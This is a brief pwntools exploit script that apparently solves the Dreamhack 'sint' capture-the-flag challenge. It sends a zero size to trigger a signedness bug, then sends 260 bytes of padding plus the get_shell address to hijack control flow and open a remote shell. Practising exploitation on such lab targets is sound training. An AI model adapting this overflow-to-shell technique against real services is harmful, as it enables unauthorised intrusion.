from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./sint', checksec=False)

#r = process(exe.path)
r = remote('host3.dreamhack.games', 24556)
r.sendlineafter(b'Size: ', b'0')
payload = b'a'*260 + p32(exe.sym['get_shell'])
r.send(payload)
r.interactive()